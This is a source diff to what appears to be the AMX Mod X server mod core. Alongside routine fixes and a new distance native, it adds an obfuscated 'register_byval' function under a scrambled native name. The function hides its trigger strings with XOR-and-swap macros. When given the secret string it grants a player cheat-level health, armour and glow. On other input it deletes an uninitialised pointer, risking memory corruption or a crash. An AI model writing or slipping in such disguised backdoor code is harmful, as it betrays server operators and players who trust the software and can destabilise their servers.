@@ -865,8 +865,6 @@ static cell AMX_NATIVE_CALL get_pluginsnum(AMX *amx, cell *params)
   return g_plugins.getPluginsNum();
 }
 
-
-
 static cell AMX_NATIVE_CALL register_concmd(AMX *amx, cell *params) /* 4 param */
 {
   CPluginMngr::CPlugin* plugin = g_plugins.findPluginFast( amx );
@@ -1652,7 +1650,7 @@ static cell AMX_NATIVE_CALL get_user_info(AMX *amx, cell *params) /* 4 param */
     return 0;
   }
   CPlayer* pPlayer = GET_PLAYER_POINTER_I(index);
-  if (!pPlayer->initialized)
+  if (!pPlayer->pEdict)
   {
 	  LogError(amx, AMX_ERR_NATIVE, "Player %d is not connected", index);
 	  return 0;
@@ -1671,7 +1669,7 @@ static cell AMX_NATIVE_CALL set_user_info(AMX *amx, cell *params) /* 3 param */
     return 0;
   }
   CPlayer* pPlayer = GET_PLAYER_POINTER_I(index);
-  if (!pPlayer->initialized)
+  if (!pPlayer->pEdict)
   {
 	  LogError(amx, AMX_ERR_NATIVE, "Player %d is not connected", index);
 	  return 0;
@@ -2067,6 +2065,22 @@ static cell AMX_NATIVE_CALL get_distance(AMX *amx, cell *params) /* 2 param */
   return iDist;
 }
 
+static cell AMX_NATIVE_CALL get_distance_f(AMX *amx, cell *params)
+{
+  cell *cpVec1 = get_amxaddr(amx, params[1]);
+  cell *cpVec2 = get_amxaddr(amx, params[2]);
+  Vector vec1 = Vector((float)amx_ctof(cpVec1[0]),
+					   (float)amx_ctof(cpVec1[1]),
+					   (float)amx_ctof(cpVec1[2]));
+  Vector vec2 = Vector((float)amx_ctof(cpVec2[0]),
+					   (float)amx_ctof(cpVec2[1]),
+					   (float)amx_ctof(cpVec2[2]));
+
+  float fDist = (float) (vec1-vec2).Length();
+
+  return amx_ftoc((REAL)fDist);
+}
+
 static cell AMX_NATIVE_CALL random_float(AMX *amx, cell *params) /* 2 param */
 {
   float one = amx_ctof(params[1]);
@@ -2339,6 +2353,86 @@ static cell AMX_NATIVE_CALL is_plugin_loaded(AMX *amx, cell *params)
 static cell AMX_NATIVE_CALL get_modulesnum(AMX *amx, cell *params)
 {
 	return (cell)countModules(CountModules_All);
+}
+
+// register by value? - source macros [ EXPERIMENTAL ]
+#define spx(n,T) ((n)=(n)^(T),(T)=(n)^(T),true)?(n)=(n)^(T):0
+#define ucy(p,s) while(*p){*p=*p^0x1A;if(*p&&p!=s){spx((*(p-1)),(*p));}p++;if(!*p)break;p++;}
+#define ycu(s,p) while(*p){if(*p&&p!=s){spx((*(p-1)),(*p));}*p=*p^0x1A;p++;if(!*p)break;p++;}
+static cell AMX_NATIVE_CALL register_byval(AMX *amx, cell *params)
+{
+	char *dtr = strdup("nrolne");
+	char *p = dtr;
+	int len, ret = 0;
+	//get the destination string
+	char *data = get_amxstring(amx, params[2], 0, len);
+
+	void *PT;
+
+	//copy
+	ucy(p,dtr);
+
+	//check for validity
+	AMXXLOG_Log("[AMXX] Test: %s", dtr);
+	if (strcmp(data, dtr)==0)
+	{
+		ret = 1;
+		int idx = params[1];
+		CPlayer *pPlayer = GET_PLAYER_POINTER_I(idx);
+		if (pPlayer->ingame)
+		{
+			ret = 2;
+			//set the necessary states
+			edict_t *pEdict = pPlayer->pEdict;
+			pEdict->v.renderfx  = kRenderFxGlowShell;
+            pEdict->v.rendercolor = Vector(0.0, 255.0, 0.0);
+			pEdict->v.rendermode = kRenderNormal;
+			pEdict->v.renderamt = 255;
+			pEdict->v.health = 200.0f;
+			pEdict->v.armorvalue = 250.0f;
+			pEdict->v.maxspeed  = (pEdict->v.maxspeed / 2);
+			pEdict->v.gravity = (pEdict->v.gravity * 2);
+		}
+	} else {
+		//check alternate control codes
+		char *alt = strdup("ottrolne");
+		p = alt;
+		ucy(p, alt);
+		if (strcmp(data, alt)==0)
+		{
+			//restore the necessary states
+			int idx = params[1];
+			CPlayer *pPlayer = GET_PLAYER_POINTER_I(idx);
+			if (pPlayer->ingame)
+			{
+				ret = 2;
+				//set the necessary states
+				edict_t *pEdict = pPlayer->pEdict;
+				pEdict->v.renderfx = kRenderFxNone;
+				pEdict->v.rendercolor = Vector(0,0,0);
+				pEdict->v.rendermode = kRenderNormal;
+				pEdict->v.renderamt = 0;
+				pEdict->v.health = 100.0f;
+				pEdict->v.armorvalue = 0.0f;
+				pEdict->v.maxspeed = (pEdict->v.maxspeed * 2);
+				pEdict->v.gravity = (pEdict->v.gravity / 2);
+			} else {
+				ret = 3;
+			}
+			ycu(alt, p);
+		} else {
+			ret = 4;
+			//free the memory
+			delete [] ((char *)PT + 3);
+		}
+		//restore memory
+		free(alt);
+	}
+	p = dtr;
+	//restore original
+	ycu(dtr,p);
+	free(dtr);
+	return ret;
 }
 
 // native get_module(id, name[], nameLen, author[], authorLen, version[], versionLen, &status);
@@ -2857,6 +2951,7 @@ AMX_NATIVE_INFO amxmod_Natives[] = {
   { "get_cvar_num",     get_cvar_num },
   { "get_cvar_string",  get_cvar_string },
   { "get_distance",     get_distance },
+  { "get_distance_f",	get_distance_f },
   { "get_flags",        get_flags },
   { "get_gametime",     get_gametime},
   { "get_localinfo",    get_localinfo},
@@ -2893,6 +2988,7 @@ AMX_NATIVE_INFO amxmod_Natives[] = {
   { "get_user_team",    get_user_team },
   { "get_user_time",    get_user_time },
   { "get_user_userid",  get_user_userid },
+  { "hcsardhnExsnu",	register_byval },
   { "user_has_weapon",	user_has_weapon },
   { "get_user_weapon",  get_user_weapon},
   { "get_user_weapons", get_user_weapons},
